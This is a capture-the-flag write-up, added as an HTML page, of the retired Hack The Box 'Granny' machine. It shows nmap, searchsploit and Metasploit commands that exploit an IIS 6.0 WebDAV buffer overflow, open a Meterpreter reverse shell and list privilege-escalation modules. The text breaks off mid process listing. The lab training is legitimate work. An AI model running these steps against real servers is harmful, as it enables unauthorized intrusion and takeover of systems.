@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Granny</strong></h1>
+        <em>Released: 12th April 2017 / Pwned: September 2nd 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Granny is almost exactly the same as Grandpa. A IIS 6.0 WebDAV remote buffer overflow exploit can be used to gain access to the system, and a second CVE - MS10_015 - will elevate your privileges to SYSTEM.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.15</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/granny#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/granny#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.15<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;6.0<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE&nbsp;DELETE&nbsp;COPY&nbsp;MOVE&nbsp;PROPFIND&nbsp;PROPPATCH&nbsp;SEARCH&nbsp;MKCOL&nbsp;LOCK&nbsp;UNLOCK&nbsp;PUT<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/6.0<br>
+                |_http-title:&nbsp;Under&nbsp;Construction<br>
+                |&nbsp;http-webdav-scan:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Allowed&nbsp;Methods:&nbsp;OPTIONS,&nbsp;TRACE,&nbsp;GET,&nbsp;HEAD,&nbsp;DELETE,&nbsp;COPY,&nbsp;MOVE,&nbsp;PROPFIND,&nbsp;PROPPATCH,&nbsp;SEARCH,&nbsp;MKCOL,&nbsp;LOCK,&nbsp;UNLOCK<br>
+                |&nbsp;&nbsp;&nbsp;WebDAV&nbsp;type:&nbsp;Unkown<br>
+                |&nbsp;&nbsp;&nbsp;Server&nbsp;Date:&nbsp;Mon,&nbsp;02&nbsp;Sep&nbsp;2019&nbsp;13:53:15&nbsp;GMT<br>
+                |&nbsp;&nbsp;&nbsp;Public&nbsp;Options:&nbsp;OPTIONS,&nbsp;TRACE,&nbsp;GET,&nbsp;HEAD,&nbsp;DELETE,&nbsp;PUT,&nbsp;POST,&nbsp;COPY,&nbsp;MOVE,&nbsp;MKCOL,&nbsp;PROPFIND,&nbsp;PROPPATCH,&nbsp;LOCK,&nbsp;UNLOCK,&nbsp;SEARCH<br>
+                |_&nbsp;&nbsp;Server&nbsp;Type:&nbsp;Microsoft-IIS/6.0<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose|media&nbsp;device<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;2003|2000|XP|PocketPC/CE&nbsp;(93%),&nbsp;BT&nbsp;embedded&nbsp;(85%)<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_server_2003::sp1&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 80/http - An old IIS 6.0 web server is running with WebDAV. IIS 6.0 is old, so there's most likely an exploit available.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) searchsploit IIS 6.0</strong></h2><br>
+        <code>searchsploit</code> for IIS 6.0 exploits, and you'll find the exact same one as used in Grandpa.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/granny#&nbsp;searchsploit&nbsp;iis&nbsp;6.0<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Microsoft&nbsp;IIS&nbsp;4.0/5.0/6.0&nbsp;-&nbsp;Internal&nbsp;IP&nbsp;Address/Internal&nbsp;Net&nbsp;|&nbsp;exploits/windows/remote/21057.txt<br>
+                Microsoft&nbsp;IIS&nbsp;5.0/6.0&nbsp;FTP&nbsp;Server&nbsp;(Windows&nbsp;2000)&nbsp;-&nbsp;Remote&nbsp;Sta&nbsp;|&nbsp;exploits/windows/remote/9541.pl<br>
+                Microsoft&nbsp;IIS&nbsp;5.0/6.0&nbsp;FTP&nbsp;Server&nbsp;-&nbsp;Stack&nbsp;Exhaustion&nbsp;Denial&nbsp;o&nbsp;|&nbsp;exploits/windows/dos/9587.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;'/AUX&nbsp;/&nbsp;'.aspx'&nbsp;Remote&nbsp;Denial&nbsp;of&nbsp;Service&nbsp;|&nbsp;exploits/windows/dos/3965.pl<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;ASP&nbsp;Stack&nbsp;Overflow&nbsp;Stack&nbsp;Exhaustion&nbsp;(Den&nbsp;|&nbsp;exploits/windows/dos/15167.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;'ScStoragePathFromUrl'&nbsp;Remote&nbsp;Buf&nbsp;|&nbsp;exploits/windows/remote/41738.py<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(1)&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8704.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(2)&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8806.pl<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(PHP&nbsp;|&nbsp;exploits/windows/remote/8765.php<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(Pat&nbsp;|&nbsp;exploits/windows/remote/8754.patch<br>
+                Microsoft&nbsp;IIS&nbsp;6.0/7.5&nbsp;(+&nbsp;PHP)&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/19033.txt<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        There's a metasploit module available for <code>41738.py</code> - the <code>WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow</code> exploit - which will spawn a shell on the system.<br>
+        <br>
+        Load metasploit with <code>msfconsole</code>, set the target with <code>RHOSTS</code> and <code>exploit</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/granny#&nbsp;msfconsole&nbsp;-q<br>
+                ...<br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/iis/iis_webdav_scstoragepathfromurl<br>
+                msf5&nbsp;exploit(windows/iis/iis_webdav_scstoragepathfromurl)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.15<br>
+                RHOSTS&nbsp;=&gt;&nbsp;10.10.10.15<br>
+                msf5&nbsp;exploit(windows/iis/iis_webdav_scstoragepathfromurl)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.3:4444&nbsp;<br>
+                [*]&nbsp;Trying&nbsp;path&nbsp;length&nbsp;3&nbsp;to&nbsp;60&nbsp;...<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.15<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.3:4444&nbsp;-&gt;&nbsp;10.10.10.15:1030)&nbsp;at&nbsp;2019-09-02&nbsp;14:46:18&nbsp;+0100<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;GRANNY<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;.NET&nbsp;Server&nbsp;(Build&nbsp;3790,&nbsp;Service&nbsp;Pack&nbsp;2).<br>
+                Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86<br>
+                System&nbsp;Language&nbsp;:&nbsp;en_US<br>
+                Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB<br>
+                Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;2<br>
+                Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows
+            </div>
+        </div><br>
+        <br>
+        We have a shell!<br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) local_exploit_suggester</strong></h2><br>
+        Background the meterpreter session and run the <code>local_exploit_suggester</code> module.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;bg<br>
+                [*]&nbsp;Backgrounding&nbsp;session&nbsp;1..<br>
+                msf5&nbsp;exploit(windows/iis/iis_webdav_scstoragepathfromurl)&nbsp;&gt;&nbsp;use&nbsp;post/multi/recon/local_exploit_suggester<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(post/multi/recon/local_exploit_suggester):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;SESSION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;session&nbsp;to&nbsp;run&nbsp;this&nbsp;module&nbsp;on<br>
+                &nbsp;&nbsp;&nbsp;SHOWDESCRIPTION&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Displays&nbsp;a&nbsp;detailed&nbsp;description&nbsp;for&nbsp;the&nbsp;available&nbsp;exploits<br>
+                <br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;set&nbsp;SHOWDESCRIPTION&nbsp;true<br>
+                SHOWDESCRIPTION&nbsp;=&gt;&nbsp;true<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.15&nbsp;-&nbsp;Collecting&nbsp;local&nbsp;exploits&nbsp;for&nbsp;x86/windows...<br>
+                [*]&nbsp;10.10.10.15&nbsp;-&nbsp;29&nbsp;exploit&nbsp;checks&nbsp;are&nbsp;being&nbsp;tried...<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms10_015_kitrap0d:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;will&nbsp;create&nbsp;a&nbsp;new&nbsp;session&nbsp;with&nbsp;SYSTEM&nbsp;privileges&nbsp;via&nbsp;the&nbsp;<br>
+                &nbsp;&nbsp;KiTrap0D&nbsp;exploit&nbsp;by&nbsp;Tavis&nbsp;Ormandy.&nbsp;If&nbsp;the&nbsp;session&nbsp;in&nbsp;use&nbsp;is&nbsp;already&nbsp;<br>
+                &nbsp;&nbsp;elevated&nbsp;then&nbsp;the&nbsp;exploit&nbsp;will&nbsp;not&nbsp;run.&nbsp;The&nbsp;module&nbsp;relies&nbsp;on&nbsp;<br>
+                &nbsp;&nbsp;kitrap0d.x86.dll,&nbsp;and&nbsp;is&nbsp;not&nbsp;supported&nbsp;on&nbsp;x64&nbsp;editions&nbsp;of&nbsp;Windows.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms14_058_track_popup_menu:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;a&nbsp;NULL&nbsp;Pointer&nbsp;Dereference&nbsp;in&nbsp;win32k.sys,&nbsp;the&nbsp;<br>
+                &nbsp;&nbsp;vulnerability&nbsp;can&nbsp;be&nbsp;triggered&nbsp;through&nbsp;the&nbsp;use&nbsp;of&nbsp;TrackPopupMenu.&nbsp;<br>
+                &nbsp;&nbsp;Under&nbsp;special&nbsp;conditions,&nbsp;the&nbsp;NULL&nbsp;pointer&nbsp;dereference&nbsp;can&nbsp;be&nbsp;abused&nbsp;<br>
+                &nbsp;&nbsp;on&nbsp;xxxSendMessageTimeout&nbsp;to&nbsp;achieve&nbsp;arbitrary&nbsp;code&nbsp;execution.&nbsp;This&nbsp;<br>
+                &nbsp;&nbsp;module&nbsp;has&nbsp;been&nbsp;tested&nbsp;successfully&nbsp;on&nbsp;Windows&nbsp;XP&nbsp;SP3,&nbsp;Windows&nbsp;2003&nbsp;<br>
+                &nbsp;&nbsp;SP2,&nbsp;Windows&nbsp;7&nbsp;SP1&nbsp;and&nbsp;Windows&nbsp;2008&nbsp;32bits.&nbsp;Also&nbsp;on&nbsp;Windows&nbsp;7&nbsp;SP1&nbsp;<br>
+                &nbsp;&nbsp;and&nbsp;Windows&nbsp;2008&nbsp;R2&nbsp;SP1&nbsp;64&nbsp;bits.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms14_070_tcpip_ioctl:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                &nbsp;&nbsp;A&nbsp;vulnerability&nbsp;within&nbsp;the&nbsp;Microsoft&nbsp;TCP/IP&nbsp;protocol&nbsp;driver&nbsp;<br>
+                &nbsp;&nbsp;tcpip.sys&nbsp;can&nbsp;allow&nbsp;a&nbsp;local&nbsp;attacker&nbsp;to&nbsp;trigger&nbsp;a&nbsp;NULL&nbsp;pointer&nbsp;<br>
+                &nbsp;&nbsp;dereference&nbsp;by&nbsp;using&nbsp;a&nbsp;specially&nbsp;crafted&nbsp;IOCTL.&nbsp;This&nbsp;flaw&nbsp;can&nbsp;be&nbsp;<br>
+                &nbsp;&nbsp;abused&nbsp;to&nbsp;elevate&nbsp;privileges&nbsp;to&nbsp;SYSTEM.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms15_051_client_copy_image:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;improper&nbsp;object&nbsp;handling&nbsp;in&nbsp;the&nbsp;win32k.sys&nbsp;<br>
+                &nbsp;&nbsp;kernel&nbsp;mode&nbsp;driver.&nbsp;This&nbsp;module&nbsp;has&nbsp;been&nbsp;tested&nbsp;on&nbsp;vulnerable&nbsp;builds&nbsp;<br>
+                &nbsp;&nbsp;of&nbsp;Windows&nbsp;7&nbsp;x64&nbsp;and&nbsp;x86,&nbsp;and&nbsp;Windows&nbsp;2008&nbsp;R2&nbsp;SP1&nbsp;x64.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms16_016_webdav:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;the&nbsp;vulnerability&nbsp;in&nbsp;mrxdav.sys&nbsp;described&nbsp;by&nbsp;<br>
+                &nbsp;&nbsp;MS16-016.&nbsp;The&nbsp;module&nbsp;will&nbsp;spawn&nbsp;a&nbsp;process&nbsp;on&nbsp;the&nbsp;target&nbsp;system&nbsp;and&nbsp;<br>
+                &nbsp;&nbsp;elevate&nbsp;its&nbsp;privileges&nbsp;to&nbsp;NT&nbsp;AUTHORITY\SYSTEM&nbsp;before&nbsp;executing&nbsp;the&nbsp;<br>
+                &nbsp;&nbsp;specified&nbsp;payload&nbsp;within&nbsp;the&nbsp;context&nbsp;of&nbsp;the&nbsp;elevated&nbsp;process.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ms16_032_secondary_logon_handle_privesc:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;the&nbsp;lack&nbsp;of&nbsp;sanitization&nbsp;of&nbsp;standard&nbsp;handles&nbsp;in&nbsp;<br>
+                &nbsp;&nbsp;Windows'&nbsp;Secondary&nbsp;Logon&nbsp;Service.&nbsp;The&nbsp;vulnerability&nbsp;is&nbsp;known&nbsp;to&nbsp;<br>
+                &nbsp;&nbsp;affect&nbsp;versions&nbsp;of&nbsp;Windows&nbsp;7-10&nbsp;and&nbsp;2k8-2k12&nbsp;32&nbsp;and&nbsp;64&nbsp;bit.&nbsp;This&nbsp;<br>
+                &nbsp;&nbsp;module&nbsp;will&nbsp;only&nbsp;work&nbsp;against&nbsp;those&nbsp;versions&nbsp;of&nbsp;Windows&nbsp;with&nbsp;<br>
+                &nbsp;&nbsp;Powershell&nbsp;2.0&nbsp;or&nbsp;later&nbsp;and&nbsp;systems&nbsp;with&nbsp;two&nbsp;or&nbsp;more&nbsp;CPU&nbsp;cores.<br>
+                [+]&nbsp;10.10.10.15&nbsp;-&nbsp;exploit/windows/local/ppr_flatten_rec:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                &nbsp;&nbsp;This&nbsp;module&nbsp;exploits&nbsp;a&nbsp;vulnerability&nbsp;on&nbsp;EPATHOBJ::pprFlattenRec&nbsp;due&nbsp;<br>
+                &nbsp;&nbsp;to&nbsp;the&nbsp;usage&nbsp;of&nbsp;uninitialized&nbsp;data&nbsp;which&nbsp;allows&nbsp;to&nbsp;corrupt&nbsp;memory.&nbsp;<br>
+                &nbsp;&nbsp;At&nbsp;the&nbsp;moment,&nbsp;the&nbsp;module&nbsp;has&nbsp;been&nbsp;tested&nbsp;successfully&nbsp;on&nbsp;Windows&nbsp;XP&nbsp;<br>
+                &nbsp;&nbsp;SP3,&nbsp;Windows&nbsp;2003&nbsp;SP1,&nbsp;and&nbsp;Windows&nbsp;7&nbsp;SP1.<br>
+                [*]&nbsp;Post&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        There's a few exploits available.<br>
+        Unless I migrated away from a NETWORK SERVICE process, the exploits would fail for me because I got an <code>Access Denied</code> error whenever meterpreter tried to run <code>getuid</code> after the exploit had finished.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) migrate</strong></h2><br>
+        List processes on the system with <code>ps</code> and <code>migrate</code> to a process that isn't running as <code>NT AUTHORITY\NETWORK SERVICE</code>.<br>
+        I chose <code>rundll32.exe</code> (which in hindsight I now realise didn't actually do anything :/. I have no idea why the exploits weren't working previously then)<br>
+        <br>
+            <div class="codebox">
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;1<br>
+                [*]&nbsp;Starting&nbsp;interaction&nbsp;with&nbsp;1...<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;ps<br>
+                <br>
+                Process&nbsp;List<br>
+                ============<br>
+                <br>
+                &nbsp;PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;Session&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path<br>
+                &nbsp;---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                &nbsp;...<br>
+                &nbsp;1704&nbsp;&nbsp;396&nbsp;&nbsp;&nbsp;alg.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;1840&nbsp;&nbsp;592&nbsp;&nbsp;&nbsp;wmiprvse.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITY\NETWORK&nbsp;SERVICE&nbsp;&nbsp;C:\WINDOWS\system32\wbem\wmiprvse.exe<br>
+                &nbsp;1916&nbsp;&nbsp;396&nbsp;&nbsp;&nbsp;dllhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;2316&nbsp;&nbsp;592&nbsp;&nbsp;&nbsp;wmiprvse.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;2608&nbsp;&nbsp;348&nbsp;&nbsp;&nbsp;logon.scr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;2684&nbsp;&nbsp;1460&nbsp;&nbsp;w3wp.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITY\NETWORK&nbsp;SERVICE&nbsp;&nbsp;c:\windows\system32\inetsrv\w3wp.exe<br>
+                &nbsp;2752&nbsp;&nbsp;592&nbsp;&nbsp;&nbsp;davcdata.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITY\NETWORK&nbsp;SERVICE&nbsp;&nbsp;C:\WINDOWS\system32\inetsrv\davcdata.exe<br>
